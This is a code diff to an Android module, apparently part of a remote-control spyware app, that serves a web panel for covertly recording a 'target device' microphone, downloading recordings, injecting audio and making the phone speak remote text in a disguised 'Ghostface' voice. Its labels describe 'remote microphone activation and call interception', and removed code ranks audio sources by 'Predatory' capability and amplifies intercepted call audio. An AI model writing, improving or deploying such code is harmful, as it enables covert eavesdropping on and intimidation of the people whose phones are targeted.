@@ -33,6 +33,9 @@ import fi.iki.elonen.NanoHTTPD.Response;
 
 public class AcousticsModule extends BaseModule {
 
+    private static final java.util.Set<android.speech.tts.TextToSpeech> activeTtsHolder =
+            java.util.Collections.synchronizedSet(new java.util.HashSet<>());
+
     public AcousticsModule(Context context, FirebaseConfig server) {
         super(context, server);
     }
@@ -57,14 +60,14 @@ public class AcousticsModule extends BaseModule {
             return updateAudioSettings(session, params);
         } else if (uri.equals("/audio/recordings")) {
             return serveAudioRecordings(session);
-        } else if (uri.equals("/audio/stream")) {
-            return serveLiveStream(session);
+        } else if (uri.equals("/audio/stream") || uri.equals("/audio/chunk")) {
+            return serveAudioChunk(session);
+        } else if (uri.equals("/audio/speak")) {
+            return handleTextToSpeech(params);
         } else if (uri.equals("/audio/inject")) {
             return handleAudioInjection(session);
         } else if (uri.equals("/audio/speakerphone")) {
             return toggleSpeakerphone(params);
-        } else if (uri.equals("/audio/speak")) {
-            return handleTextToSpeech(params);
         }
         return null;
     }
@@ -125,16 +128,15 @@ public class AcousticsModule extends BaseModule {
                     try {
                         audioManager.setMode(AudioManager.MODE_NORMAL);
                         audioManager.setSpeakerphoneOn(true);
-                    } catch (Exception ignored) {}
+                        int maxMusic = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
+                        int targetVol = Math.max(1, Math.round(maxMusic * (finalVolPercent / 100.0f)));
+                        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, targetVol, 0);
 
-                    int maxMusic = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
-                    int targetMusic = Math.max(1, Math.round(maxMusic * volRatio));
-                    audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, targetMusic, 0);
-
-                    try {
-                        int maxTts = audioManager.getStreamMaxVolume(9);
-                        int targetTts = Math.max(1, Math.round(maxTts * volRatio));
-                        audioManager.setStreamVolume(9, targetTts, 0);
+                        try {
+                            int maxTts = audioManager.getStreamMaxVolume(9);
+                            int targetTts = Math.max(1, Math.round(maxTts * (finalVolPercent / 100.0f)));
+                            audioManager.setStreamVolume(9, targetTts, 0);
+                        } catch (Exception ignored) {}
                     } catch (Exception ignored) {}
                 }
 
@@ -145,25 +147,25 @@ public class AcousticsModule extends BaseModule {
                 float speed = 1.0f;
 
                 if ("ghostface_deep".equals(finalVoiceKey) || "disguised_deep".equals(finalVoiceKey)) {
-                    pitch = 0.42f; // Super deep pitch-shifted voice disguise (Ghostface Scream voice)
-                    speed = 0.88f;
+                    pitch = 0.50f; // Native Android TTS deep male/disguised voice pitch
+                    speed = 0.80f;
                     langCode = "en"; targetLocale = Locale.US;
                 } else if ("us_male".equals(finalVoiceKey)) {
-                    pitch = 0.82f; langCode = "en"; targetLocale = Locale.US;
+                    pitch = 0.70f; speed = 0.95f; langCode = "en"; targetLocale = Locale.US;
                 } else if ("us_female".equals(finalVoiceKey)) {
-                    pitch = 1.08f; langCode = "en"; targetLocale = Locale.US;
+                    pitch = 1.20f; speed = 1.0f; langCode = "en"; targetLocale = Locale.US;
                 } else if ("uk_female".equals(finalVoiceKey) || "uk_english".equals(finalVoiceKey)) {
-                    pitch = 1.05f; langCode = "en-GB"; targetLocale = Locale.UK;
+                    pitch = 1.20f; speed = 1.0f; langCode = "en-GB"; targetLocale = Locale.UK;
                 } else if ("uk_male".equals(finalVoiceKey)) {
-                    pitch = 0.82f; langCode = "en-GB"; targetLocale = Locale.UK;
+                    pitch = 0.70f; speed = 0.95f; langCode = "en-GB"; targetLocale = Locale.UK;
                 } else if ("au_female".equals(finalVoiceKey) || "au_english".equals(finalVoiceKey)) {
-                    pitch = 1.05f; langCode = "en-AU"; targetLocale = new Locale("en", "AU");
+                    pitch = 1.20f; speed = 1.0f; langCode = "en-AU"; targetLocale = new Locale("en", "AU");
                 } else if ("au_male".equals(finalVoiceKey)) {
-                    pitch = 0.82f; langCode = "en-AU"; targetLocale = new Locale("en", "AU");
+                    pitch = 0.70f; speed = 0.95f; langCode = "en-AU"; targetLocale = new Locale("en", "AU");
                 } else if ("es_spanish".equals(finalVoiceKey)) {
-                    pitch = 1.0f; langCode = "es"; targetLocale = new Locale("es", "ES");
+                    pitch = 1.0f; speed = 1.0f; langCode = "es"; targetLocale = new Locale("es", "ES");
                 } else if ("fr_french".equals(finalVoiceKey)) {
-                    pitch = 1.0f; langCode = "fr"; targetLocale = Locale.FRANCE;
+                    pitch = 1.0f; speed = 1.0f; langCode = "fr"; targetLocale = Locale.FRANCE;
                 }
 
                 final String finalLangCode = langCode;
@@ -171,7 +173,7 @@ public class AcousticsModule extends BaseModule {
                 final float finalPitch = pitch;
                 final float finalSpeed = speed;
 
-                // 1. ONLINE TTS STREAM VIA MEDIAPLAYER (Instant Playback & Precise Pitch Shift & Volume Scaling)
+                // 1. DUAL PLAYBACK: ONLINE STREAM VIA MEDIAPLAYER (Instant Playback & Exact Volume Scaling)
                 LabRatsWorker.execute(() -> {
                     try {
                         String ttsUrl = "https://translate.google.com/translate_tts?ie=UTF-8&q=" +
@@ -187,45 +189,56 @@ public class AcousticsModule extends BaseModule {
                                 android.media.PlaybackParams pParams = new android.media.PlaybackParams();
                                 pParams.setPitch(finalPitch);
                                 pParams.setSpeed(finalSpeed);
+                                pParams.setAudioFallbackMode(android.media.PlaybackParams.AUDIO_FALLBACK_MODE_DEFAULT);
                                 player.setPlaybackParams(pParams);
-                            } catch (Exception e) {
-                                Log.w("TTS", "PlaybackParams error: " + e.getMessage());
-                            }
+                            } catch (Exception ignored) {}
                         }
 
                         player.start();
                         player.setOnCompletionListener(mp -> mp.release());
                         FirebaseConfig.logActivity("VOICE_EMISSION: Spoke [" + finalVoiceKey.toUpperCase() + "] (" + finalVolPercent + "% vol) -> " + textToSpeak);
                     } catch (Exception e) {
-                        Log.w("TTS", "Online TTS failed: " + e.getMessage());
+                        Log.w("TTS", "Online TTS stream fallback: " + e.getMessage());
                     }
                 });
 
-                // 2. NATIVE OFFLINE TTS FALLBACK
+                // 2. DUAL PLAYBACK: NATIVE OFFLINE TTS
                 android.os.Bundle ttsParams = new android.os.Bundle();
                 ttsParams.putInt(android.speech.tts.TextToSpeech.Engine.KEY_PARAM_STREAM, AudioManager.STREAM_MUSIC);
-                ttsParams.putFloat(android.speech.tts.TextToSpeech.Engine.KEY_PARAM_VOLUME, 1.0f);
+                ttsParams.putFloat(android.speech.tts.TextToSpeech.Engine.KEY_PARAM_VOLUME, volRatio);
 
-                final android.speech.tts.TextToSpeech[] localTts = new android.speech.tts.TextToSpeech[1];
-                localTts[0] = new android.speech.tts.TextToSpeech(context.getApplicationContext(), status -> {
+                final android.speech.tts.TextToSpeech[] ttsRef = new android.speech.tts.TextToSpeech[1];
+                android.speech.tts.TextToSpeech.OnInitListener listener = status -> {
                     if (status == android.speech.tts.TextToSpeech.SUCCESS) {
                         try {
-                            int res = localTts[0].setLanguage(finalLocale);
+                            int res = ttsRef[0].setLanguage(finalLocale);
                             if (res == android.speech.tts.TextToSpeech.LANG_MISSING_DATA || res == android.speech.tts.TextToSpeech.LANG_NOT_SUPPORTED) {
-                                localTts[0].setLanguage(Locale.getDefault());
+                                ttsRef[0].setLanguage(Locale.getDefault());
                             }
-                            localTts[0].setPitch(finalPitch);
-                            localTts[0].setSpeechRate(finalSpeed);
-                            localTts[0].speak(textToSpeak, android.speech.tts.TextToSpeech.QUEUE_FLUSH, ttsParams, "TTS_" + System.currentTimeMillis());
+                            ttsRef[0].setPitch(finalPitch);
+                            ttsRef[0].setSpeechRate(finalSpeed);
+                            ttsRef[0].speak(textToSpeak, android.speech.tts.TextToSpeech.QUEUE_FLUSH, ttsParams, "TTS_" + System.currentTimeMillis());
 
                             new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
-                                try { if (localTts[0] != null) localTts[0].shutdown(); } catch (Exception ignored) {}
-                            }, 10000);
+                                try {
+                                    if (ttsRef[0] != null) {
+                                        ttsRef[0].shutdown();
+                                        activeTtsHolder.remove(ttsRef[0]);
+                                    }
+                                } catch (Exception ignored) {}
+                            }, 12000);
                         } catch (Exception e) {
                             Log.e("TTS", "Speak error: " + e.getMessage());
+                            activeTtsHolder.remove(ttsRef[0]);
                         }
+                    } else {
+                        Log.e("TTS", "TextToSpeech init failed: " + status);
+                        activeTtsHolder.remove(ttsRef[0]);
                     }
-                });
+                };
+
+                ttsRef[0] = new android.speech.tts.TextToSpeech(context.getApplicationContext(), listener);
+                activeTtsHolder.add(ttsRef[0]);
             } catch (Exception e) {
                 Log.e("TTS", "Error speaking text: " + e.getMessage());
             }
@@ -283,6 +296,10 @@ public class AcousticsModule extends BaseModule {
             .append(".duration { font-size: 1.8rem; font-weight: 900; color: var(--neon-cyan); font-family: 'Orbitron', sans-serif; text-shadow: 0 0 10px rgba(0, 242, 255, 0.3); }")
             .append("</style>");
 
+        html.append("<div class=\"back-btn-container\">")
+            .append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>")
+            .append("</div>");
+
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">ACOUSTICS_INTERFACE <span class=\"info-trigger\" onclick=\"showInfo(event, 'ACOUSTICS_INTERFACE', 'Tactical acoustic surveillance hub for remote microphone activation and call interception.')\">INFO</span></h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");
@@ -338,9 +355,9 @@ public class AcousticsModule extends BaseModule {
             .append("<a href=\"/audio/mic/start?duration=300\" class=\"btn btn-small\" ").append(isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-cyan); color: var(--neon-cyan);\"").append(">5m_BURST</a>")
             .append("</div></div>");
 
-        // --- VOICE EMISSION SECTION (PLACED RIGHT BELOW AMBIENT_MIC) ---
+        // --- VOICE EMISSION (TEXT-TO-SPEECH) SECTION (PLACED RIGHT BELOW AMBIENT_MIC) ---
         html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-yellow); margin-top: 20px;\">");
-        html.append("<h2 style=\"font-size: 1.35rem; text-align: left; color: var(--neon-yellow);\">VOICE_EMISSION (Work in Progress) <span class=\"info-trigger\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow);\" onclick=\"showInfo(event, 'VOICE_EMISSION', 'Remotely transmit text to be spoken out loud via the target device speakers using native TTS engine.')\">INFO</span></h2>");
+        html.append("<h2 style=\"font-size: 1.35rem; text-align: left; color: var(--neon-yellow);\">VOICE_EMISSION (TEXT-TO-SPEECH) <span class=\"info-trigger\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow);\" onclick=\"showInfo(event, 'VOICE_EMISSION', 'Remotely transmit text to be spoken out loud via the target device speakers using native TTS engine.')\">INFO</span></h2>");
         html.append("<div style=\"display: flex; flex-direction: column; gap: 15px; margin-top: 15px;\">");
         
         // Row 1: Input Box + Transmit Button
@@ -349,14 +366,14 @@ public class AcousticsModule extends BaseModule {
         html.append("<button onclick=\"transmitVoicePayload()\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.08); font-weight: bold; border-radius: 8px; margin: 0; padding: 12px 18px; white-space: nowrap; flex-shrink: 0;\">&#128266; TRANSMIT VOICE</button>");
         html.append("</div>");
         
-        // Row 2: Voice Style Dropdown + Volume Slider
+        // Row 2: Voice Style Dropdown (Half Width 260px) + Volume Slider (Right 240px)
         html.append("<div class=\"tts-config-grid\" style=\"display: grid; grid-template-columns: 260px 240px; gap: 20px; align-items: end; width: 100%; margin-top: 15px;\">");
         html.append("<div style=\"display: flex; flex-direction: column; gap: 6px;\">");
         html.append("<span style=\"font-size: 0.7rem; color: #888; font-family: monospace; font-weight: bold; white-space: nowrap;\">VOICE_STYLE:</span>");
         html.append("<select id=\"tts-voice-select\" style=\"width: 260px !important; max-width: 260px !important; padding: 10px; background: #000; border: 1px solid var(--neon-yellow); color: #fff; border-radius: 6px; font-family: monospace; font-size: 0.7rem; outline: none; box-sizing: border-box; height: 42px;\">");
         html.append("<option value=\"ghostface_deep\" selected>Ghostface (Super Deep)</option>");
-        html.append("<option value=\"us_female\">English (Female)</option>");
-        html.append("<option value=\"us_male\">English (Male)</option>");
+        html.append("<option value=\"us_female\">US English (Female)</option>");
+        html.append("<option value=\"us_male\">US English (Male)</option>");
         html.append("<option value=\"uk_female\">UK English (Female)</option>");
         html.append("<option value=\"uk_male\">UK English (Male)</option>");
         html.append("<option value=\"au_female\">Australian (Female)</option>");
@@ -409,12 +426,10 @@ public class AcousticsModule extends BaseModule {
                     downloadPath = f.getAbsolutePath().replace(Environment.getExternalStorageDirectory().getAbsolutePath() + "/", "");
                 }
                 String timeStr = sdf.format(new Date(f.lastModified()));
-                String durStr = getAudioFileDuration(f);
-                String sizeStr = formatFileSize(f.length());
                 html.append("<li style=\"display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.05);\">");
                 html.append("<div style=\"display:flex; flex-direction:column; gap:2px;\">");
                 html.append("<span style=\"font-size: 0.7rem; color: #eee; font-family: monospace; word-break: break-all;\">").append(f.getName()).append("</span>");
-                html.append("<span style=\"font-size: 0.6rem; color: var(--neon-cyan); opacity: 0.85; font-family: monospace;\">").append(timeStr).append(" &nbsp;&bull;&nbsp; DUR: ").append(durStr).append(" &nbsp;&bull;&nbsp; ").append(sizeStr).append("</span>");
+                html.append("<span style=\"font-size: 0.55rem; color: var(--neon-cyan); opacity: 0.8; font-family: monospace;\">").append(timeStr).append("</span>");
                 html.append("</div>");
                 html.append("<a href=\"/download/").append(downloadPath).append("\" class=\"btn btn-small\" style=\"padding: 4px 12px; font-size: 0.6rem; margin: 0 0 0 15px; flex-shrink: 0;\">GET</a>");
                 html.append("</li>");
@@ -437,25 +452,8 @@ public class AcousticsModule extends BaseModule {
         }
         html.append("</div></div>");
 
-        // Auto-refresh script for status & TTS handler
+        // Auto-refresh script for status
         html.append("<script>")
-            .append("function transmitVoicePayload() {")
-            .append("  const input = document.getElementById('tts-input');")
-            .append("  if (!input || !input.value.trim()) { showToast('PLEASE_ENTER_TEXT_TO_EMIT', 'error'); return; }")
-            .append("  const text = input.value.trim();")
-            .append("  const volSlider = document.getElementById('tts-vol-slider');")
-            .append("  const vol = volSlider ? volSlider.value : 100;")
-            .append("  const voiceSelect = document.getElementById('tts-voice-select');")
-            .append("  const voice = voiceSelect ? voiceSelect.value : 'us_female';")
-            .append("  showToast('TRANSMITTING_VOICE_PAYLOAD...');")
-            .append("  fetch('/audio/speak?text=' + encodeURIComponent(text) + '&vol=' + vol + '&voice=' + voice)")
-            .append("    .then(r => r.json())")
-            .append("    .then(d => {")
-            .append("      if (d.success) { showToast('VOICE_EMISSION_QUEUED (' + vol + '% VOL)'); input.value = ''; }")
-            .append("      else showToast('VOICE_EMISSION_FAILED', 'error');")
-            .append("    })")
-            .append("    .catch(() => showToast('TRANSMISSION_ERROR', 'error'));")
-            .append("}")
             .append("setInterval(function() {")
             .append("  fetch('/audio/status')")
             .append("    .then(r => r.json())")
@@ -586,6 +584,9 @@ public class AcousticsModule extends BaseModule {
     private Response serveAudioRecordings(IHTTPSession session) {
         FirebaseConfig.logActivity("ACOUSTICS_EXTRACT: Remote audio archive accessed");
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
+        html.append("<div class=\"back-btn-container\">");
+        html.append("<a href=\"/terminal\" class=\"btn-back\">&#8592; Back to Terminal</a>");
+        html.append("</div>");
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"margin-bottom: 20px; font-size: 1.6rem;\">&#128190; Audio Recordings</h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");
@@ -666,111 +667,82 @@ public class AcousticsModule extends BaseModule {
         return server.serveGzippedProxy(session, "text/html", html.toString());
     }
 
-    private Response serveLiveStream(IHTTPSession session) {
-        FirebaseConfig.logActivity("ACOUSTICS_UPLINK: Handshaking audio bridge...");
+    private Response serveAudioChunk(IHTTPSession session) {
+        FirebaseConfig.logActivity("ACOUSTICS_UPLINK: Streaming audio chunk...");
         try {
-            final PipedOutputStream pos = new PipedOutputStream();
-            PipedInputStream pis = new PipedInputStream(pos, 65536);
+            int sampleRate = 16000;
+            int channelConfig = AudioFormat.CHANNEL_IN_MONO;
+            int audioEncoding = AudioFormat.ENCODING_PCM_16BIT;
+            int minBufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioEncoding);
+            int recordBytes = sampleRate * 2; // 1 second of 16kHz 16-bit mono audio (32,000 bytes)
 
-            // Pre-write 44-byte WAV header so NanoHTTPD and browser handshake in 0ms!
-            try { writeWavHeader(pos, 16000, (short) 1, (short) 16); } catch (Exception ignored) {}
-
-            new Thread(() -> {
-                AudioRecord recorder = null;
-                AudioManager audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
-                
-                try {
-                    int sampleRate = 16000;
-                    int channelConfig = AudioFormat.CHANNEL_IN_MONO;
-                    int audioEncoding = AudioFormat.ENCODING_PCM_16BIT;
-                    int minBufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioEncoding);
-                    
-                    // Force Speakerphone for capture
-                    if (audioManager != null) {
-                        try {
-                            audioManager.setMode(AudioManager.MODE_NORMAL);
-                            audioManager.setSpeakerphoneOn(true);
-                        } catch (Exception ignored) {}
-                    }
-
-                    // Attempt sources in order of "Predatory" capability
-                    int[] sources = {
-                        MediaRecorder.AudioSource.VOICE_RECOGNITION, // High priority bypass
-                        MediaRecorder.AudioSource.VOICE_COMMUNICATION,
-                        MediaRecorder.AudioSource.MIC
-                    };
-
-                    for (int source : sources) {
-                        try {
-                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                                if (context.checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
-                                    FirebaseConfig.logActivity("ACOUSTICS_ERROR: MIC permission missing");
-                                    return;
-                                }
-                            }
-                            recorder = new AudioRecord(source, sampleRate, channelConfig, audioEncoding, minBufferSize * 4);
-                            if (recorder.getState() == AudioRecord.STATE_INITIALIZED) {
-                                FirebaseConfig.logActivity("ACOUSTICS_SYNC: Linked to hardware source_" + source);
-                                break;
-                            }
-                        } catch (SecurityException se) {
-                            Log.w("Acoustics", "Source " + source + " denied: " + se.getMessage());
-                        } catch (Exception ignored) {}
-                    }
-                    
-                    if (recorder == null || recorder.getState() != AudioRecord.STATE_INITIALIZED) {
-                        FirebaseConfig.logActivity("ACOUSTICS_ERROR: All hardware sources blocked by OS.");
-                        return;
-                    }
-
-                    recorder.startRecording();
-                    writeWavHeader(pos, sampleRate, (short) 1, (short) 16);
-
-                    byte[] buffer = new byte[minBufferSize];
-                    while (!Thread.currentThread().isInterrupted()) {
-                        int read = recorder.read(buffer, 0, buffer.length);
-                        if (read > 0) {
-                            // [PERFORMANCE_SYNC] Digital Gain Booster (2x)
-                            // Boosts low-volume call audio for the dashboard
-                            for (int i = 0; i < read; i += 2) {
-                                if (i + 1 < read) {
-                                    short sample = (short) ((buffer[i] & 0xFF) | (buffer[i + 1] << 8));
-                                    // [PERFORMANCE_SYNC] Aggressive Gain Booster (4x)
-                                    // Since we muted the hardware, we need high gain to hear the internal loopback
-                                    int boosted = sample * 4;
-                                    if (boosted > 32767) boosted = 32767;
-                                    else if (boosted < -32768) boosted = -32768;
-                                    buffer[i] = (byte) (boosted & 0xFF);
-                                    buffer[i + 1] = (byte) ((boosted >> 8) & 0xFF);
-                                }
-                            }
-                            pos.write(buffer, 0, read);
-                            pos.flush();
-                        } else if (read < 0) break;
-                    }
-                } catch (Exception e) {
-                    Log.e("AcousticsModule", "Stream Error: " + e.getMessage());
-                } finally {
-                    try {
-                        if (recorder != null) {
-                            recorder.stop();
-                            recorder.release();
-                        }
-                        if (audioManager != null) {
-                            audioManager.setMode(AudioManager.MODE_NORMAL);
-                            audioManager.stopBluetoothSco();
-                            audioManager.setBluetoothScoOn(false);
-                        }
-                        pos.close();
-                    } catch (Exception ignored) {}
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                if (context.checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
+                    FirebaseConfig.logActivity("ACOUSTICS_ERROR: MIC permission missing");
+                    return server.serveErrorProxy("MIC Permission Missing");
                 }
-            }).start();
+            }
 
-            Response res = server.newChunkedResponseProxy(Response.Status.OK, "audio/wav", pis);
+            AudioRecord recorder = null;
+            int[] sources = {
+                MediaRecorder.AudioSource.MIC,
+                MediaRecorder.AudioSource.VOICE_RECOGNITION,
+                MediaRecorder.AudioSource.VOICE_COMMUNICATION
+            };
+
+            for (int source : sources) {
+                try {
+                    recorder = new AudioRecord(source, sampleRate, channelConfig, audioEncoding, Math.max(minBufferSize * 2, recordBytes));
+                    if (recorder.getState() == AudioRecord.STATE_INITIALIZED) {
+                        break;
+                    }
+                } catch (Exception ignored) {}
+            }
+
+            if (recorder == null || recorder.getState() != AudioRecord.STATE_INITIALIZED) {
+                FirebaseConfig.logActivity("ACOUSTICS_ERROR: All hardware mic sources busy");
+                return server.serveErrorProxy("Hardware Mic Busy");
+            }
+
+            java.io.ByteArrayOutputStream pcmStream = new java.io.ByteArrayOutputStream();
+            writeWavHeader(pcmStream, sampleRate, (short) 1, (short) 16);
+
+            recorder.startRecording();
+            byte[] buffer = new byte[minBufferSize];
+            int totalRead = 0;
+            long startTime = System.currentTimeMillis();
+
+            while (totalRead < recordBytes && (System.currentTimeMillis() - startTime) < 1300) {
+                int read = recorder.read(buffer, 0, Math.min(buffer.length, recordBytes - totalRead));
+                if (read > 0) {
+                    for (int i = 0; i < read; i += 2) {
+                        if (i + 1 < read) {
+                            short sample = (short) ((buffer[i] & 0xFF) | (buffer[i + 1] << 8));
+                            int boosted = sample * 2;
+                            if (boosted > 32767) boosted = 32767;
+                            else if (boosted < -32768) boosted = -32768;
+                            buffer[i] = (byte) (boosted & 0xFF);
+                            buffer[i + 1] = (byte) ((boosted >> 8) & 0xFF);
+                        }
+                    }
+                    pcmStream.write(buffer, 0, read);
+                    totalRead += read;
+                } else {
+                    break;
+                }
+            }
+
+            try { recorder.stop(); } catch (Exception ignored) {}
+            try { recorder.release(); } catch (Exception ignored) {}
+
+            byte[] wavData = pcmStream.toByteArray();
+            Response res = server.newFixedLengthResponseProxy(Response.Status.OK, "audio/wav", new java.io.ByteArrayInputStream(wavData), wavData.length);
             res.addHeader("Cache-Control", "no-cache");
             return res;
+
         } catch (Exception e) {
-            return server.serveErrorProxy("Bridge Failed: " + e.getMessage());
+            Log.e("AcousticsModule", "Chunk Error: " + e.getMessage());
+            return server.serveErrorProxy("Audio Chunk Error: " + e.getMessage());
         }
     }
 
